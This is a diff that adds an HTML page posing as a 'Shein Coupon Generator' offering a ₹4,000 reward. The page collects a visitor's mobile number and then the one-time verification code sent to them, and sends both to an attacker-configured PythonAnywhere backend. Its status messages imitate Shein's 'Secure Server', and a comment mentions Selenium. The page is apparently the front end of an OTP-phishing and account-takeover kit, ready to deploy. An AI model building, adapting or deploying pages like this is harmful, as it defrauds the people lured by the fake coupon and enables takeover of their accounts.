@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shein Coupon Generator 4000</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --gold: #ffcc00;
+            --gold-dark: #b8860b;
+            --bg: #0a0a0b;
+            --card-bg: rgba(255, 255, 255, 0.07);
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--bg);
+            background-image: radial-gradient(circle at 50% 50%, #1a1a1c 0%, #000 100%);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow-x: hidden;
+        }
+
+        /* Premium Glass Card */
+        .main-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 40px 30px;
+            border-radius: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.9);
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+            position: relative;
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Status Message Styling */
+        #statusDisplay {
+            margin: 15px 0;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            display: none;
+            background: rgba(255, 204, 0, 0.1);
+            border: 1px solid var(--gold);
+            color: var(--gold);
+            animation: slideDown 0.3s ease;
+            word-wrap: break-word;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 { margin: 0; font-weight: 800; color: #fff; letter-spacing: -1px; font-size: 2rem; }
+        
+        .price-tag { 
+            color: var(--gold); 
+            font-size: 2.8rem; 
+            font-weight: 800; 
+            margin: 10px 0 25px; 
+            text-shadow: 0 0 20px rgba(255, 204, 0, 0.3);
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 15px;
+            border-radius: 15px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(0, 0, 0, 0.5);
+            color: #fff;
+            font-size: 1.1rem;
+            text-align: center;
+            box-sizing: border-box;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--gold);
+            box-shadow: 0 0 15px rgba(255, 204, 0, 0.2);
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            border-radius: 15px;
+            border: none;
+            background: linear-gradient(45deg, var(--gold-dark), var(--gold));
+            color: #000;
+            font-weight: 800;
+            font-size: 1rem;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+        }
+
+        button:hover { 
+            filter: brightness(1.2); 
+            transform: scale(1.03); 
+            box-shadow: 0 10px 20px rgba(255, 204, 0, 0.3);
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: scale(1);
+        }
+
+        #otpSection {
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .footer-text {
+            margin-top: 25px;
+            font-size: 0.7rem;
+            color: #555;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-card">
+        <h1>Shein Coupon</h1>
+        <div class="price-tag">₹4,000</div>
+
+        <div id="statusDisplay"></div>
+
+        <div id="mobileSection">
+            <input type="tel" id="mobile" placeholder="Enter Mobile Number" maxlength="10">
+            <button id="sendBtn" onclick="sendOtp()">Get Verification Code</button>
+        </div>
+
+        <div id="otpSection" style="display:none;">
+            <h3 style="margin: 0 0 15px 0; font-size: 0.9rem; color: var(--gold);">SECURE OTP VERIFICATION</h3>
+            <input type="text" id="otp" placeholder="Enter 6-Digit OTP" maxlength="6">
+            <button id="verifyBtn" onclick="verifyOtp()">Verify & Claim Reward</button>
+        </div>
+
+        <div class="footer-text">Secure Encrypted Session</div>
+    </div>
+
+<script>
+    // --- CONFIGURATION ---
+    // REPLACE THIS URL WITH YOUR ACTUAL PYTHONANYWHERE LINK
+    const BACKEND_URL = "https://yourusername.pythonanywhere.com"; 
+
+    let session_id = null;
+
+    // Function to show on-screen messages
+    function showMessage(msg) {
+        const display = document.getElementById("statusDisplay");
+        display.innerText = msg;
+        display.style.display = "block";
+        
+        // Auto-hide after 10 seconds (Selenium can be slow)
+        setTimeout(() => { 
+            if(display.innerText === msg) display.style.display = "none"; 
+        }, 10000);
+    }
+
+    // --- SEND OTP LOGIC ---
+    async function sendOtp() {
+        const mobile = document.getElementById("mobile").value;
+        const btn = document.getElementById("sendBtn");
+
+        if (mobile.length < 10) {
+            return showMessage("❌ Please enter a valid 10-digit number");
+        }
+
+        btn.disabled = true;
+        btn.innerText = "Processing...";
+        showMessage("⏳ Connecting to Shein Secure Server...");
+
+        try {
+            const response = await fetch(`${BACKEND_URL}/send_otp`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ mobile: mobile })
+            });
+            
+            const data = await response.json();
+            
+            showMessage(data.status || data.message);
+
+            if (data.session_id) {
+                session_id = data.session_id;
+                document.getElementById("otpSection").style.display = "block";
+                btn.innerText = "Resend Code";
+            }
+            btn.disabled = false;
+        } catch (err) {
+            showMessage("❌ Server Error: Ensure Backend is Running");
+            btn.disabled = false;
+            btn.innerText = "Get Verification Code";
+        }
+    }
+
+    // --- VERIFY OTP LOGIC ---
+    async function verifyOtp() {
+        const otp = document.getElementById("otp").value;
+        const btn = document.getElementById("verifyBtn");
+
+        if (!otp) return showMessage("❌ Please enter the security code");
+
+        btn.disabled = true;
+        btn.innerText = "Verifying Code...";
+        showMessage("⏳ Authenticating... please wait");
+
+        try {
+            const response = await fetch(`${BACKEND_URL}/verify_otp`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    otp: otp,
+                    session_id: session_id
+                })
+            });
+
+            const data = await response.json();
+            showMessage(data.status || data.message);
+            
+            btn.disabled = false;
+            btn.innerText = "Verify & Claim Reward";
+        } catch (err) {
+            showMessage("❌ Verification Failed. Connection Lost.");
+            btn.disabled = false;
+            btn.innerText = "Verify & Claim Reward";
+        }
+    }
+</script>
+
+</body>
+</html>
